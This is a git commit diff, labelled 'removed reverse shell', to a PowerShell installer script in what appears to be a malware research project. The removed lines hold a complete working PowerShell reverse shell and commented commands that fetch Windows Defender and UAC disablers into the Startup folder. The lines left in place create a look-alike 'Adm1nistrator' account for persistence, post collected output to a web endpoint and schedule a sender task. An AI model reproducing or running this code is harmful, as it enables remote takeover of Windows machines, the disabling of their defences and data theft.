86e58217578dc14c997cddb55d2563a6bfdc14ad
Reiya Ihara <papichu.chime@icloud.com>
2025-12-21 01:49:41 -0800

    removed reverse shell

--- Original/Resources/installer.ps1
+++ Original/Resources/installer.ps1
@@ -22,18 +22,6 @@ function New-RandomTempDirectory {
 $dirPath = New-RandomTempDirectory
 # Write-Host "Created directory: $dirPath"
 
-# Download windows disabler
-# $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
-# $url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/disableWinDef.ps1"
-# $outFile = Join-Path $startupPath "disableWinDef.ps1"
-# Invoke-WebRequest -Uri $url -OutFile $outFile
-
-# Download windows defender and uac remover
-# $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
-# $url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/defender_remover13.exe"
-# $outFile = Join-Path $startupPath "defender_remover.exe"
-# Invoke-WebRequest -Uri $url -OutFile $outFile
-
 # Create Admin account for persistence
 # Run PowerShell as Administrator
 $username = "Adm1nistrator"
@@ -85,7 +73,7 @@ Invoke-WebRequest `
     -Body $output `
     -ContentType "text/plain"
 
-$client = New-Object System.Net.Sockets.TCPClient('192.168.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
 '@ | Set-Content -Path $filePath -Encoding UTF8
 
 # Create task schedule for sender.ps1
